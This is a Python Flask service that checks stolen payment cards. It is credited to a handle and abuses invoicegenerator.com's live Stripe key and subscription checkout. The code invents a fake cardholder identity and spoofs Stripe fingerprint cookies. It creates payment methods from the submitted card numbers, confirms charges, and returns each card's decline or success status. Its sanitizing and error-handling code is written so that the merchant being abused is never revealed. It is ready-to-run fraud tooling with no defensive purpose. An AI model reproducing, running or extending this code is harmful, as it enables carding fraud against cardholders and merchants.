import requests, json, re, random, string, sys, time, uuid, html as html_mod, os
from flask import Flask, request as flask_request, jsonify

app = Flask(__name__)

# =====================================================
# Invoice Generator | Stripe Gateway | $9 USD
# Credit: @xoxhunterxd
# Gateway: Stripe | Type: Charge | Amount: $9.00
# Site: invoicegenerator.com | No Captcha
# =====================================================

BASE = 'https://invoicegenerator.com'
STRIPE_PK = 'pk_live_51RzooPDORc95H4l4IncyNSOv4bkLknTmfnjWglVuXJifYN2Hyn4TpLzeajrLDMEjiwEdFjynPnDZykQLEHHE0xT000zND6d8Z1'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'


def get_stripe_cookies():
    """Get device fingerprint cookies from m.stripe.com — unlocks PM creation."""
    s = requests.Session()
    s.headers.update({'User-Agent': UA})
    try:
        r = s.post('https://m.stripe.com/6', json={
            'v': 2, 'id': str(uuid.uuid4()),
            'data': {'url': f'{BASE}/upgrade'},
        }, headers={
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }, timeout=30)
        cookies = dict(s.cookies)
        mid = cookies.get('m', str(uuid.uuid4()))
        sid = str(uuid.uuid4())
        guid = str(uuid.uuid4()).replace('-', '')[:32]
        return mid, sid, guid
    except:
        return str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4()).replace('-', '')[:32]


def check_card(cc_input):
    start_time = time.time()

    parts = cc_input.strip().split("|")
    if len(parts) != 4:
        return result_json("", "", "", "", "Invalid format", 0)

    n, m, y, c = parts
    m = m.zfill(2)
    if len(y) == 2:
        y = "20" + y

    s = requests.Session()
    s.headers.update({'User-Agent': UA, 'Accept': 'application/json'})

    try:
        # ============================================
        # Step 1: Get CSRF + cookies from site
        # ============================================
        r = s.get(f'{BASE}/upgrade', timeout=30)
        csrf_match = re.search(r'csrf-token.*?content="(.*?)"', r.text)
        csrf = csrf_match.group(1) if csrf_match else ''
        if not csrf:
            return result_json(n, m, y, c, "No CSRF", elapsed(start_time))

        # ============================================
        # Step 2: Get Stripe price ID
        # ============================================
        r = s.get(f'{BASE}/api/billing/prices', headers={
            'X-CSRF-TOKEN': csrf,
            'Referer': f'{BASE}/upgrade',
        }, timeout=30)
        price_id = r.json().get('monthly', {}).get('id', '')
        if not price_id:
            return result_json(n, m, y, c, "No price ID", elapsed(start_time))

        # ============================================
        # Step 3: Random identity
        # ============================================
        fname = random.choice(["James", "William", "Oliver", "Harry", "George", "Thomas", "Jack", "Charlie"])
        lname = random.choice(["Smith", "Jones", "Davis", "Wilson", "Brown", "Taylor", "Clark", "Walker"])
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        email = f"{fname.lower()}.{rand}@gmail.com"
        cardholder = f"{fname} {lname}"
        postal = f"{random.randint(10000, 99999)}"

        # ============================================
        # Step 4: Get Stripe device cookies
        # ============================================
        mid, sid, guid = get_stripe_cookies()

        # ============================================
        # Step 5: Create PaymentMethod via Stripe API
        # ============================================
        r = requests.post('https://api.stripe.com/v1/payment_methods', data={
            'type': 'card',
            'card[number]': n,
            'card[exp_month]': m,
            'card[exp_year]': y,
            'card[cvc]': c,
            'billing_details[name]': cardholder,
            'billing_details[email]': email,
            'billing_details[address][postal_code]': postal,
            'key': STRIPE_PK,
            'payment_user_agent': 'stripe.js/b24ee09572; stripe-js-v3/b24ee09572; card-element',
            'guid': guid,
            'muid': mid,
            'sid': sid,
        }, headers={
            'Authorization': f'Bearer {STRIPE_PK}',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': UA,
        }, timeout=30)

        pm_data = r.json()
        if pm_data.get('error'):
            return result_json(n, m, y, c, pm_data['error'].get('message', 'PM error'), elapsed(start_time))

        pm_id = pm_data.get('id', '')
        if not pm_id:
            return result_json(n, m, y, c, "No PM created", elapsed(start_time))

        # ============================================
        # Step 6: Start subscription → get PaymentIntent
        # ============================================
        r = s.post(f'{BASE}/api/stripe/subscribe/start', json={
            'price_id': price_id,
            'email': email,
        }, headers={
            'X-CSRF-TOKEN': csrf,
            'Content-Type': 'application/json',
            'Referer': f'{BASE}/upgrade',
            'X-Requested-With': 'XMLHttpRequest',
        }, timeout=30)

        if r.status_code != 200:
            try:
                err = r.json().get('message', r.text[:200])
            except:
                err = f"Start failed ({r.status_code})"
            return result_json(n, m, y, c, err, elapsed(start_time))

        intent_data = r.json()
        client_secret = intent_data.get('client_secret', '')
        intent_type = intent_data.get('intent_type', '')

        if not client_secret:
            return result_json(n, m, y, c, "No client_secret", elapsed(start_time))

        # ============================================
        # Step 7: Confirm PaymentIntent with PM
        # ============================================
        pi_id = client_secret.split('_secret_')[0]

        if intent_type == 'setup':
            confirm_url = f'https://api.stripe.com/v1/setup_intents/{pi_id}/confirm'
        else:
            confirm_url = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'

        r = requests.post(confirm_url, data={
            'payment_method': pm_id,
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': 'true',
            'client_secret': client_secret,
            'return_url': f'{BASE}/checkout/callback',
            'key': STRIPE_PK,
        }, headers={
            'Authorization': f'Bearer {STRIPE_PK}',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': UA,
        }, timeout=30)

        confirm = r.json()

        if confirm.get('error'):
            err = confirm['error']
            decline = err.get('decline_code', '')
            msg = decline if decline else err.get('message', 'Confirm error')
            return result_json(n, m, y, c, msg, elapsed(start_time))

        status = confirm.get('status', '')

        # ============================================
        # Step 8: Handle response
        # ============================================
        if status == 'requires_action':
            return result_json(n, m, y, c, "3DS Required", elapsed(start_time))
        elif status == 'succeeded':
            return result_json(n, m, y, c, "Charged $1.00 ✅", elapsed(start_time))
        elif status == 'requires_payment_method':
            err_key = 'last_setup_error' if intent_type == 'setup' else 'last_payment_error'
            err_obj = confirm.get(err_key, {})
            decline = err_obj.get('decline_code', '')
            msg = decline if decline else err_obj.get('message', status)
            return result_json(n, m, y, c, msg, elapsed(start_time))
        else:
            return result_json(n, m, y, c, status or "Unknown", elapsed(start_time))

    except requests.exceptions.Timeout:
        return result_json(n, m, y, c, "Timeout", elapsed(start_time))
    except requests.exceptions.ConnectionError:
        return result_json(n, m, y, c, "Connection Error", elapsed(start_time))
    except Exception as e:
        return result_json(n, m, y, c, f"{str(e)[:150]}", elapsed(start_time))


def sanitize(msg):
    """Strip any URLs, domains, API paths so the gateway site is never revealed."""
    import re
    msg = re.sub(r'https?://[^\s",\}]+', '', msg)
    msg = re.sub(r'[a-zA-Z0-9-]+\.(com|net|org|io|co|dev|xyz)[^\s]*', '', msg)
    msg = re.sub(r'/api/[^\s"]*', '', msg)
    msg = re.sub(r'<[^>]+>', '', msg)
    msg = re.sub(r'\s{2,}', ' ', msg).strip(' .,;:')
    if not msg or len(msg) < 3:
        msg = "Gateway Error"
    return msg


def result_json(n, m, y, c, response, t):
    return {
        "card": f"{n}|{m}|{y}|{c}",
        "credit": "@xoxhunterxd",
        "gateway": "Stripe 1 USD",
        "response": sanitize(response),
        "time": f"{t}s"
    }


def elapsed(start):
    return round(time.time() - start, 1)


@app.route('/str')
def str_endpoint():
    cc = flask_request.args.get('cc')
    if not cc:
        return jsonify({"error": "Missing 'cc' parameter. Usage: /str?cc=number|mm|yyyy|cvv"}), 400
    result = check_card(cc)
    return jsonify(result)


# ============================================
# Error handlers — never reveal site/gateway
# ============================================
@app.errorhandler(400)
def bad_request(e):
    return jsonify({"error": "Bad Request"}), 400

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Not Found"}), 404

@app.errorhandler(405)
def method_not_allowed(e):
    return jsonify({"error": "Method Not Allowed"}), 405

@app.errorhandler(500)
def internal_error(e):
    return jsonify({"error": "Internal Server Error"}), 500

@app.errorhandler(502)
def bad_gateway(e):
    return jsonify({"error": "Bad Gateway"}), 502

@app.errorhandler(503)
def service_unavailable(e):
    return jsonify({"error": "Service Unavailable"}), 503

@app.errorhandler(Exception)
def handle_exception(e):
    return jsonify({"error": "Server Error"}), 500


if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
